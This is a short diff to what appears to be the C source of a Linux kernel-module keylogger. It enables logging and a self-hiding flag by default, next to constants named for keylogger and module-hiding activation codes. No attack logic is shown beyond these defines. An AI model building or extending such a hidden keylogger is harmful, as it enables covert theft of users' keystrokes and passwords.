@@ -5,6 +5,9 @@
 #define MODULE
 #endif
 
+#define LOG
+#define HIDE
+
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/string.h>
@@ -21,7 +24,6 @@ int keyboard_hook(struct notifier_block *, unsigned long code, void *);
 
 /* DATA */
 
-#define LOG
 #define KEYLOGGER_ACTIVATION_CODE 122
 #define KEYLOGGER_DEACTIVATION_CODE 123
 #define HIDEMODULE_ACTIVATION_CODE 124
